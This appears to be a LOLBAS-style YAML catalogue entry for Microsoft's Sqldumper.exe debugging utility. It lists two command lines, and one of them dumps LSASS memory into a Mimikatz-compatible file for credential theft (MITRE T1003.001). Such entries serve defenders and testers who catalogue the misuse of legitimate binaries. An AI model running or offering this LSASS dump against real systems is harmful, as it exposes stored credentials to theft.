---
Name: Sqldumper.exe
Description: Debugging utility included with Microsoft SQL.
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: sqldumper.exe 464 0 0x0110
    Description: Dump process by PID and create a dump file (Appears to create a dump file called SQLDmprXXXX.mdmp).
    Usecase: Dump process using PID.
    Category: Dump
    Privileges: Administrator
    MitreID: T1003
    OperatingSystem: Windows
  - Command: sqldumper.exe 540 0 0x01100:40
    Description: 0x01100:40 flag will create a Mimikatz compatible dump file.
    Usecase: Dump LSASS.exe to Mimikatz compatible dump using PID.
    Category: Dump
    Privileges: Administrator
    MitreID: T1003.001
    OperatingSystem: Windows
Full_Path:
  - Path: C:\Program Files\Microsoft SQL Server\90\Shared\SQLDumper.exe
  - Path: C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesX86\Microsoft Analysis\AS OLEDB\140\SQLDumper.exe
Code_Sample:
  - Code:
Detection:
  - IOC:
Resources:
  - Link: https://twitter.com/countuponsec/status/910969424215232518
  - Link: https://twitter.com/countuponsec/status/910977826853068800
  - Link: https://support.microsoft.com/en-us/help/917825/how-to-use-the-sqldumper-exe-utility-to-generate-a-dump-file-in-sql-se
Acknowledgement:
  - Person: Luis Rocha
    Handle: '@countuponsec'
---
